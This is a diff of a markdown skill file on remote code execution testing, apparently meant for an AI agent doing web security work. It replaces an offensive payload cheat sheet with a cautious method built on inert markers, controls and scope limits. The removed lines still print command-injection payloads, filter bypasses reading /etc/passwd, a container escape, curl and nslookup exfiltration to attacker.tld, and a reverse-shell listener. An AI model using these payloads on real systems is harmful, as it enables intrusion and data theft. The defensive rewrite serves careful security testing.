@@ -1,110 +1,88 @@
-# SKILL: Remote Code Execution (Command / Eval / Deserialization / Memory / Template / Header)
+# Command and code execution — follow the actual interpreter boundary
 
-## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (remote code execution (command / eval / deserialization / memory / template / header)) or pasted request matching this class
+## Boundary and discovery
 
----
+Use for process launchers, converters, diagnostics, report expressions, template compilation and code-evaluating backends.
+RCE is an outcome; begin with the specific parser or process boundary instead of injecting every input.
+Map actor input → validation → string/argv/expression construction → interpreter → allowed output/effect.
+Identify whether a shell exists. Shell punctuation passed as one argument is not shell execution.
+Conversely, argument injection can be security-relevant without a shell if attacker-controlled options change tool behavior.
+A library name, source function match or one delay does not prove natural external reach.
 
-## IDENTITY IN THIS SKILL
-RCE is the apex bug. I scan every input for command-injection sinks; eval; deserialization; XXE-RCE; SSTI-RCE; memory-corruption; header-injection-to-RCE chains.
+Record:
 
----
+- protected function and legitimate actor capability;
+- operating system, executable/interpreter and invocation mode if observed;
+- input context: argv element, shell fragment, expression, source code, filename or config;
+- allowed normal output and an inert marker observation channel;
+- privilege and containment of the actual worker, separate from hypothetical host authority.
 
-## DETECTION
-Inject `;sleep 5`, `&& sleep 5`, `$(sleep 5)`, `\`sleep 5\``, `|sleep 5`, `%0a sleep 5`, `\nsleep 5\n` — measure timing.
+## Establish normal execution semantics
 
-## EXPLOITATION
-### OS command injection — argv variants
-```
-;id
-&id
-|id
-&&id
-||id
-`id`
-$(id)
-${id}
-%0aid
-%0a/usr/bin/id
-'$(id)'
-"$(id)"
-\nid\n
-%26%26id   (& url-encoded)
-```
+Capture a successful legitimate invocation with a researcher-owned input.
+Use expected output to identify whether the app calls a process, a library or a remote service.
+Preserve authoritative job status/result, not just an accepted-queue response.
+If source is available, trace from a reachable route and include validation and argument construction.
+A direct internal call in a lab establishes semantics only, until the supported external path is shown.
 
-### Common dangerous functions per language
-- **PHP:** `system`, `passthru`, `shell_exec`, `exec`, `popen`, `proc_open`, `eval`, `assert`, `preg_replace('/x/e',...)`, `create_function`, `include`/`require` with user input, `\\backtick`
-- **Python:** `os.system`, `subprocess.Popen(... shell=True)`, `eval`, `exec`, `compile`, `pickle.loads`, `yaml.load` (safe_load is OK), `__import__`
-- **Node.js:** `child_process.exec` (vs `execFile`), `eval`, `Function('...')`, `vm.runInNewContext`, `require()` user-controlled
-- **Java:** `Runtime.exec`, `ProcessBuilder.start`, `ScriptEngine.eval`, ObjectInputStream.readObject, JNDI lookups (Log4Shell)
-- **Ruby:** `system`, `\`backtick\``, `Open3.popen3`, `eval`, `instance_eval`, `class_eval`, `Marshal.load`, `YAML.load`
-- **Go:** `exec.Command(... "sh","-c", input)` (safe-ish without shell), template/text Execute with controllable template
-- **.NET:** `Process.Start`, `cmd /c`, `XmlSerializer` with type confusion, `BinaryFormatter`, `Activator.CreateInstance` from input
+## Context-specific marker payloads
 
-### Header-injection RCE (Apache mod_cgi shellshock-style; rare today)
-```
-User-Agent: () { :;}; /bin/bash -c 'id'
-```
+Use only a permitted controlled flow. A marker should not read unrelated files, open a shell session or persist changes.
+The strings below need a known matching context; none is a universal RCE detector.
 
-### XSLT-based RCE (Saxon / Xalan)
-```xml
-<xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
-```
+| Context | Harmless challenge | Control | Interpretation |
+|---|---|---|---|
+| POSIX shell fragment | `; printf AUDIT_MARKER` | Literal `AUDIT_MARKER` where normal input remains valid | Marker appears as process output only if the separator reaches a shell in executable position. |
+| POSIX shell substitution | `$(printf AUDIT_MARKER)` | Literal `AUDIT_MARKER` | Compare shell expansion with raw argument delivery; quoting changes the question. |
+| Python expression source in a lab | `'AUDIT_' + 'MARKER'` | `'AUDIT_LITERAL'` | Proves expression evaluation, not arbitrary OS execution. |
+| JavaScript expression source in a lab | `['AUDIT','MARKER'].join('_')` | `'AUDIT_LITERAL'` | Trace whether the expression is evaluated server-side or in the browser. |
+| Argument-taking tool | One documented harmless option, such as its documented version flag, only if safe for that tool | Normal positional argument and `--` termination where supported | Different tool behavior may prove option injection; does not require shell metacharacters. |
+| Asynchronous converter | Distinct normal owned filenames/labels consumed by the worker | Same valid fixture and stable label | Establish invocation and result channel before testing an interpreter-specific boundary. |
 
-### Image-magick — old shell metachar (Imagetragick)
-```
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://attacker.tld/`id`)'
-pop graphic-context
-```
-(Mostly patched but still alive in legacy on-prem ImageMagick.)
+Do not use shell syntax against `execFile`/`spawn` as if they always invoke a shell.
+Do not assume `Runtime.exec` or `ProcessBuilder` interprets POSIX punctuation without an explicit shell.
+For Windows, establish `cmd.exe`, PowerShell or direct process semantics separately; POSIX payloads are not portable.
+`compile`, `__import__` or an interpreter API name is not sufficient evidence that attacker input executes.
 
-### Container escape via mount of host docker.sock
-```
-# inside container with /var/run/docker.sock mounted
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-```
+## Discriminating experiment sequence
 
-## PAYLOADS (real, copy-paste, grouped)
-(See above — pick by sink type)
+1. Establish the source field and normal consumer with an inert token.
+2. Identify one parser assumption: literal argument versus option, expression versus text, shell versus direct executable.
+3. Choose a paired marker/control that only the suspected interpretation should change.
+4. Repeat with the same valid job/resources and capture authoritative output.
+5. Test a competing account such as reflected input, client-side expression handling, cached output or a different worker.
+6. Only after the first interpretation is established, ask whether it crosses an intended authority boundary.
 
-## BYPASS TECHNIQUES
-- `ifs` filtering of spaces → `{cat,/etc/passwd}`, `cat$IFS/etc/passwd`, `cat<>/etc/passwd`, `cat${IFS}/etc/passwd`
-- Blacklist of `cat` → `tac`, `head`, `tail`, `nl`, `more`, `less`, `c\at`, `'c'a't'`, `c?t`
-- Blacklist of `/` → `${PATH:0:1}`, `${HOME:0:1}`, `${PWD:0:1}` (= /), or `cd / && cat etc/passwd`
-- Blacklist alphanumeric → POSIX `${0##*/}` (= bash), Bashfuck (no chars at all)
-- Blocklist of `;` → `&&`, `||`, `|`, newline `%0a`, `%0d`, `\r\n`
-- Length limit → `bash -c {echo,YmFzaCAtaSAmZ}|{base64,-d}|bash`
-- Stdout suppressed → use OOB DNS: `nslookup $(whoami).attacker.tld`
+For a blind channel, use an approved controlled marker endpoint only when the concrete interpreter path supports it.
+An HTTP callback can also be a renderer fetch; prove attribution instead of labeling every OOB request code execution.
+A timing-only hypothesis needs repeated interleaved controls and bounded delay, not a fixed sleep list.
+Avoid costly loops or memory pressure to prove evaluation.
 
-## CHAIN POTENTIAL
-RCE → service account creds → cloud → cluster → tenant.
+## Evidence and capability limits
 
-## TOOLS
-commix (auto), Burp Hackvertor, ysoserial / marshalsec / ysoserial.net for deserialization
+Preserve original valid input, exact altered bytes, process/route dataflow and matching semantic output.
+State the required role, victim interaction, executable rights and isolation actually observed.
+An application worker executing as an unprivileged sandbox account does not prove host compromise.
+A system command returning an inert marker may establish execution without reading system identities or secrets.
+A non-zero exit code does not erase an earlier proven side effect, but an exception alone proves nothing.
+Keep command injection, code injection, argument injection, SSTI and deserialization origins distinct in the report.
+Use the corresponding guide for each origin instead of stacking hypothetical chains.
 
-## COMMANDS
-```bash
-# commix
-commix -u 'https://target/?cmd=id' --batch
+## Scope, stop and reopen
 
-# ysoserial Java
-java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld/$(whoami)' | base64 -w0 > payload.b64
+Run local fixture experiments before adapting context-sensitive quoting to an allowed target.
+Do not install persistence, upload webshells, modify interpreters or collect customer data for demonstration.
+If only one legitimate filename/label is echoed, retain a lead rather than declaring execution.
+Close a tested source when the app preserves it as data and the suspected interpreter path is disproven.
+Mark missing worker access/output or unknown invocation mode inconclusive.
+Reopen for observed shell=true, dynamic expression compilation, unsafe option mapping or another consumer.
 
-# Reverse shell catcher
-nc -lvnp 4444
-# OR pwncat
-pwncat-cs -lp 4444
-```
+## References and freshness
 
-## EDGE CASES / NOT-A-BUG TRAPS
-Modern hardened apps with `execFile`/parameterized exec often feel safe but template engines (SSTI), deserialization, and dependency vulns still bite. Investigate deserialization only when an attacker-controlled path is evidenced.
+Reviewed 2026-11-13. Probe validity depends on the interpreter and invocation mode; no universal bypass is claimed.
 
-## TRIAGE ANGLE (per platform)
-Use the minimum permitted harmless marker that proves execution. Do not collect system files or customer data just to decorate the PoC.
+- [PortSwigger OS command injection](https://portswigger.net/web-security/os-command-injection) — command contexts, visible/blind channels and minimal detection.
+- [OWASP command injection defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) — argument injection and separation of data from commands.
+- [Node child_process](https://nodejs.org/api/child_process.html) — shell versus direct-process APIs and their options; verify the installed runtime.
 
-## SEVERITY & CVSS
-9.8 (Critical) Auth-less; 8.8 if requires auth.
-
-## REFERENCES
-HackTricks RCE • PayloadsAllTheThings/Command Injection • GTFOBins • LOLBAS
+For templates, deserialization and unsafe file processing, load the exact owning guide rather than treating every mechanism as a shell.
